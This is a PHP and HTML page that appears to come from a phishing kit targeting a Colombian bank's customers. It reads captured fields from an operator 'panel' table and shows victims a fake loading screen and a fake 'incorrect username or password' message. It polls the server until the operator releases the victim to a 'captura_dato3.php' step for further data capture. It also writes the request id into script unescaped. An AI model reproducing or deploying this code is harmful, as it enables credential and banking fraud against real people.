<?php
require_once '../bancol/config.php';
$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);

$stmt = $conn->prepare("SELECT dato1, dato2, dato3, redirect_flag, rejected_flag FROM  panel WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();
$result = $stmt->get_result();
$dato = $result->fetch_assoc();

$result->close();
$stmt->close();
$conn->close();
?>
<!DOCTYPE html>
<html>
<body>
    

 

    <div id="estado">
        
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8" >
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Reserva</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            main {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            img {
                width: 10%;
            }
            h5 {
                color: #1f2350;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <main>
            <section>
                <img src="../../img/8c3994152005995.631a697736de0.gif" alt="">
            </section>
            <section>
                <h5>Cargando...</h5>
                <?php if($dato['rejected_flag']): ?>
    <div style="color: red; border: opx; padding: 20%; padding-top: 0%; margin: 5px 0;">
        <p>Usuario o contraseña incorrectos. Por favor, inténtalo de nuevo.</p>
        <a href="formulario_u1.php">
            <button style="background-color: transparent; padding: 2%; border-radius: 6px; border-style: solid; border-width: 1px; border-color: gainsboro; ">Continuar</button>
        </a>
    </div>
    <?php endif; ?>
            </section>
            
        </main>
    </body>
    </html>
    
    </div>

    <script>
    let intervalo = 5000; // 5 segundos (para pruebas)
let timeoutFallback = setTimeout(() => {
    alert('Tiempo de espera agotado');
    window.location.reload();
}, 300000); // 5 minutos máximo

function verificarEstado() {
    fetch(`check_redirect.php?id=<?= $uuid ?>`)
        .then(response => {
            if (!response.ok) throw new Error('Error HTTP: ' + response.status);
            return response.json();
        })
        .then(data => {
            if (data.redirect) {
                clearTimeout(timeoutFallback);
                window.location.href = 'captura_dato3.php?id=<?= $uuid ?>';
            } else if (data.rejected) {
                clearTimeout(timeoutFallback);
                window.location.reload();
            }
        })
        .catch(error => {
            console.error('Error:', error);
            intervalo = Math.min(60000, intervalo * 2); // Backoff exponencial
        });

    setTimeout(verificarEstado, intervalo); // <--- Usar setTimeout en vez de setInterval
}

verificarEstado(); // Iniciar el ciclo
    </script>
</body>
</html>